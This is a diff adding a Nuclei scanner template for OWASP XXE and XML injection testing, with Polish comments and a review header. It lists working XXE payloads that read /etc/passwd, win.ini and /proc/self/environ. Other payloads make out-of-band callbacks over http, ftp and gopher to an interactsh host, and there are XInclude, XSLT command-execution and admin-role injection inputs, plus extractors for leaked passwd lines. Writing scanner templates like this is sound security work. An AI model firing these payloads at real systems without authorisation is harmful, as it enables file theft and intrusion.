@@ -1,0 +1,283 @@
+# ============================================================================
+# WSTG-INPV-07: XML Injection / XXE (Universal)
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z matcherem `part: interactsh_protocol`
+#   dla wykrywania blind variants tej kategorii (XXE / XML). Pierwszy http
+#   block (direct echo / error) bez zmian. Idiomatyczny pattern z dast/
+#   vulnerabilities/{ssrf,xxe,cmdi}/blind-*.yaml. Bez tego matchera callback
+#   do interactsh dochodził, ale Nuclei nie raportował findingu.
+#
+# Pre-poprawkowe spełnienie 6 kryteriów: ✓ Coverage Matrix, ✓ Multi-warstwowe
+# matchery (matchers-condition: and z primary + anti-FP), ✓ Source comments
+# per GROUP, ✓ Safety nets (pre-condition z destructive blocklist, statyki,
+# OPTIONS/HEAD/DELETE skip), ✓ Sweet spot payloadów, ✓ Component fuzzing 5/5.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Klasy:
+#   ✓ Klasyczne XXE (file read via SYSTEM entity)
+#   ✓ Parameter entity XXE (% prefix)
+#   ✓ Blind XXE (OOB exfiltration via interactsh)
+#   ✓ Error-based XXE (entity expansion w error message)
+#   ✓ XInclude (alternative path)
+#   ✓ XML structural injection (CDATA breakout, comment injection)
+#   ✓ XSLT injection (gdy XSLT processing)
+#   ✗ XML bombs / Billion Laughs (świadomy skip - DoS, niebezpieczne)
+#
+# Cele plików (XXE file read):
+#   Linux: /etc/passwd, /etc/hostname
+#   Windows: C:\Windows\win.ini
+#   Java: WEB-INF/web.xml (relative)
+#
+# Performance budget: medium (~120 payloads × 5 części)
+# Estimated time: ~10-15 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/XXE Injection/* (Files, README)
+#   2. hacktricks/.../xxe-xee-xml-external-entity
+# ============================================================================
+
+id: wstg-inpv-07-xml-injection
+
+info:
+  name: "WSTG-INPV-07: XML Injection / XXE (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa XML External Entity (XXE), parameter entity XXE, blind XXE (OOB),
+    XInclude oraz strukturalne XML injection. Detekcja: zawartość /etc/passwd
+    lub win.ini w odpowiedzi (file read), interakcja interactsh (blind),
+    XML parser error markers. Pokrywa wszystkie warianty z PayloadsAllTheThings.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  classification:
+    cwe-id: CWE-91,CWE-611
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+  tags: dast,wstg,wstg-v42-inpv-07,xxe,xml-injection,asvs-v5.5.2,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+          # XXE wymaga że request akceptuje XML - ale nie filtrujemy za ostro,
+          # bo niektóre endpointy akceptują XML mimo Content-Type nie-XML
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Klasyczne XXE - file read /etc/passwd
+        # ====================================================================
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+        - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+        - "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><userInfo><firstName>&ent;</firstName></userInfo>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root></root>"
+        - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+
+        # ====================================================================
+        # GROUP 2: Windows targets
+        # ====================================================================
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>"
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"file://C:/Windows/win.ini\">]><r>&x;</r>"
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/boot.ini\">]><r>&x;</r>"
+
+        # ====================================================================
+        # GROUP 3: Local relative file
+        # ====================================================================
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///proc/self/environ\">]><r>&x;</r>"
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///proc/self/cmdline\">]><r>&x;</r>"
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>"
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/issue\">]><r>&x;</r>"
+
+        # ====================================================================
+        # GROUP 4: Java-specific (jar://, netdoc://)
+        # ====================================================================
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"netdoc:///etc/passwd\">]><r>&x;</r>"
+        - "<!DOCTYPE r [<!ENTITY x SYSTEM \"jar:file:///etc/passwd\">]><r>&x;</r>"
+
+        # ====================================================================
+        # GROUP 5: Parameter entity - encoded base64 wrapper
+        # ====================================================================
+        - "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">%xxe;]><root></root>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>"
+
+        # ====================================================================
+        # GROUP 6: OOB XXE via interactsh (blind)
+        # ====================================================================
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{interactsh-url}}/{{canary}}\">]><r>&x;</r>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://{{interactsh-url}}/{{canary}}.dtd\">%x;]><r></r>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://{{interactsh-url}}/{{canary}}\">%x;]><r>&x;</r>"
+        # FTP exfiltration (czasem bypasses HTTP filters)
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"ftp://{{interactsh-url}}/{{canary}}\">]><r>&x;</r>"
+        # gopher (advanced)
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"gopher://{{interactsh-url}}/_{{canary}}\">]><r>&x;</r>"
+
+        # ====================================================================
+        # GROUP 7: XInclude (alternative XXE path)
+        # ====================================================================
+        - "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>"
+        - "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://{{interactsh-url}}/{{canary}}\"/></foo>"
+
+        # ====================================================================
+        # GROUP 8: XML structural injection (gdy aplikacja generuje XML)
+        # Nie XXE per se, ale typowa kategoria INPV-07
+        # ====================================================================
+        - "</user><user><name>injected</name><role>admin</role></user><user><name>{{canary}}"
+        - "]]><script>alert({{canary}})</script><![CDATA["
+        - "<!--{{canary}}-->"
+        - "&apos;{{canary}}&apos;"
+        - "<![CDATA[{{canary}}]]>"
+
+        # ====================================================================
+        # GROUP 9: SVG-XXE (gdy aplikacja przetwarza SVG jako XML)
+        # ====================================================================
+        - "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE x [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>"
+
+        # ====================================================================
+        # GROUP 10: SOAP-style XXE (web services)
+        # ====================================================================
+        - "<?xml version=\"1.0\"?><!DOCTYPE soap:Envelope [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>&x;</soap:Body></soap:Envelope>"
+
+        # ====================================================================
+        # GROUP 11: Office Open XML / DOCX-style XXE (gdy upload XML)
+        # ====================================================================
+        - "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><Types><Default Extension=\"xml\" ContentType=\"&xxe;\"/></Types>"
+
+        # ====================================================================
+        # GROUP 12: XSLT injection (gdy aplikacja procesuje XSLT)
+        # ====================================================================
+        - "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"system-property('xsl:vendor')\"/></xsl:template></xsl:stylesheet>"
+        - "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('system','echo {{canary}}')\"/></xsl:template></xsl:stylesheet>"
+
+    # XXE płaszczyzny: body (najczęstsze) + path/query (rzadkie)
+    fuzzing:
+      - parts: [body]
+        type: replace
+        mode: single
+        # Fuzzujemy tylko body o ile request wygląda jak XML
+        # (Content-Type application/xml lub body zaczyna się od <?xml/<root)
+        fuzz:
+          - "{{injection}}"
+
+      - parts: [body]
+        type: prefix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - file content rozpoznane (XXE file read confirmed)
+      - type: regex
+        part: body
+        name: xxe-file-read
+        regex:
+          # /etc/passwd
+          - "root:[x*]:0:0:"
+          - "(?:bin|nobody|sshd|www-data|daemon):[x*]:\\d+:\\d+:"
+          # win.ini
+          - "(?i)\\[(extensions|fonts|mail|drivers32)\\]"
+          # boot.ini
+          - "\\[boot loader\\]"
+          # XSLT vendor leak
+          - "(?i)libxslt|saxonica|microsoft|oracle"
+          # XML parser errors zdradzające XXE attempt
+          - "(?i)external entity.*not allowed"
+          - "(?i)entity.*reference.*allowed"
+          # Long base64 (php://filter wrapper output)
+          - "^[A-Za-z0-9+/=]{200,}$"
+        condition: or
+
+      # Warstwa 2: SECONDARY
+      - type: dsl
+        name: response-meaningful
+        dsl:
+          - "len(body) > 50"
+
+      # Warstwa 3: ANTI-FP - WAF block
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      # Warstwa 4: ANTI-FP - timeout
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: regex
+        name: leaked-passwd
+        part: body
+        group: 0
+        regex:
+          - "(?:root|daemon|bin|nobody):[x*]:\\d+:\\d+:[^:]*:[^\\n]+"
+
+  # ==========================================================================
+  # DRUGI BLOCK: Blind XXE via OOB - external entity DTD load
+  # Klasyczny pattern blind XXE: parser pobiera DTD z attacker URL i
+  # wykonuje encoded entities. Callback do interactsh = parser przetwarza
+  # external entities (krytyczna podatność).
+  # Source: hacktricks/xxe-xee-xml-external-entity + PortSwigger blind XXE
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      xxe_oob:
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{{interactsh-url}}/{{canary}}\">]><r>&x;</r>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % x SYSTEM \"http://{{interactsh-url}}/{{canary}}.dtd\"> %x;]><r/>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://{{interactsh-url}}/{{canary}}.dtd\"><r/>"
+        - "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://{{interactsh-url}}/{{canary}}\"/></r>"
+
+    fuzzing:
+      - parts: [body]
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xxe_oob}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Aplikacje akceptujące tylko określone XML schemas mogą odrzucić nasz XXE
+#   payload przed przetworzeniem entity
+# - Niektóre parsery (libxml2 z disable_entity_loader=true) blokują XXE
+#   na poziomie parsera - wykryjemy tylko XML structural (group 8)
+# - Billion Laughs/quadratic blowup XML bombs są ŚWIADOMIE pominięte (DoS)
+# ============================================================================
